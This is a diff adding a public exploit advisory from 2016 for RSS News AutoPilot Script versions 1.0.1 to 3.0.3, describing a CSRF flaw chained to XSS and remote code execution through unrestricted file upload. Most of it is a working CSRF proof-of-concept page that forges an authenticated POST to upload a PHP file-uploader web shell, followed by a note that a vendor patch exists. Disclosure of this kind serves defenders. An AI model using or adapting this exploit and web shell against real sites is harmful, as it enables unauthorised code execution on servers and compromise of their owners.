@@ -1,0 +1,112 @@
+# Exploit Title: RSS News AutoPilot Script 1.0.1 / 3.0.3 - CSRF to
+Persistent XSS and RCE Through Unrestricted File Upload
+# Date: 30 August 2016
+# Exploit Author: Arbin Godar
+# Website : ArbinGodar.com
+# Software Link: https://codecanyon.net/item/rss-news-autopilot-script/11812898
+# Version: 1.0.1 to 3.0.3
+
+----------------------------------------------------------------------------------------------------------------------
+
+RSS News AutoPilot Script File:
+http://www.mediafire.com/file/6dmegm8ak1jv2u1/rss.zip
+
+Description:
+An Attackers are able to execute js and php code on web
+application using RSS News - AutoPilot Script which allow an attacker to
+create a post when an authenticated user/admin browses a special
+crafted web page. Also, all the process was possible without any
+authenticated user/admin for more info watch the below PoC Video.
+
+The title parameter was not filtering special characters mean
+vulnerable to XSS and while uploading image they weren't filtering the file
+type mean vulnerable to unrestricted file upload. So, now by creating CSRF
+exploit code for posting
+an article with XSS alert JS payload as title of post and php file as a
+image. Now if the
+attacker is able to perform CSRF attack sucessfully then XSS will be
+triggered and we can execute php code too.
+
+PoC Video: https://youtu.be/znDgv8K0yFk
+
+CSRF Exploit Code:
+
+ <html>
+  <body>
+   <title>[RSS News - AutoPilot Script] CSRF to Persistent XSS and
+RCE</title>
+ <script>
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://localhost/news.php?case=add", true);
+        xhr.setRequestHeader("Accept",
+"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "multipart/form-data;
+boundary=---------------------------2331884730649");
+        xhr.withCredentials = true;
+        var body = "-----------------------------2331884730649\r\n" +
+          "Content-Disposition: form-data; name=\"title\"\r\n" +
+          "\r\n" +
+          "Test\r\n" +
+          "-----------------------------2331884730649\r\n" +
+          "Content-Disposition: form-data; name=\"category_id\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "-----------------------------2331884730649\r\n" +
+          "Content-Disposition: form-data; name=\"thumbnail\";
+filename=\"lod.php\"\r\n" +
+          "Content-Type: application/octet-stream\r\n" +
+          "\r\n" +
+          "\x3c?php echo \'\x3cform action=\"\" method=\"post\"
+enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\"\x3e\';
+echo \'\x3cinput type=\"file\" name=\"file\" size=\"50\"\x3e\x3cinput
+name=\"_upl\" type=\"submit\" id=\"_upl\"
+value=\"Upload\"\x3e\x3c/form\x3e\'; if( $_POST[\'_upl\'] == \"Upload\" ) {
+if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) {
+echo \'\x3cb\x3eUpload Sukses!!!\x3cb\x3e\x3cbr\x3e\x3cbr\x3e\'; } else {
+echo \'\x3cb\x3eGagal Upload!!!\x3c/b\x3e\x3cbr\x3e\x3cbr\x3e\'; } } ?\x3e
+\r\n" +
+          "\r\n" +
+          "-----------------------------2331884730649\r\n" +
+          "Content-Disposition: form-data; name=\"details\"\r\n" +
+          "\r\n" +
+          "\x3cp\x3etest\x3c/p\x3e\r\n" +
+          "-----------------------------2331884730649\r\n" +
+          "Content-Disposition: form-data; name=\"published\"\r\n" +
+          "\r\n" +
+          "1\r\n" +
+          "-----------------------------2331884730649\r\n" +
+          "Content-Disposition: form-data; name=\"submit\"\r\n" +
+          "\r\n" +
+          "\r\n" +
+          "-----------------------------2331884730649--\r\n";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i);
+        xhr.send(new Blob([aBody]));
+      }
+    </script>
+    <br><br><br>
+    <center>
+    <h2><font color="red">[RSS News - AutoPilot Script] CSRF to Persistent
+XSS and RCE</font></h2>
+    <form action="#">
+      <input type="button" value="Submit request"
+onclick="submitRequest();" />
+    </form>
+  </center>
+  </body>
+</html>
+
+Vendor Shouted Urgent Update:
+http://wpsup.com/products/rss-news-script/urgent-update-fix-security-bugs/
+
+Fix/Patch: Update to latest version.
+
+----------------------------------------------------------------------------------------------------------------------
+
+Regards,
+Arbin Godar
+https://twitter.com/arbingodar
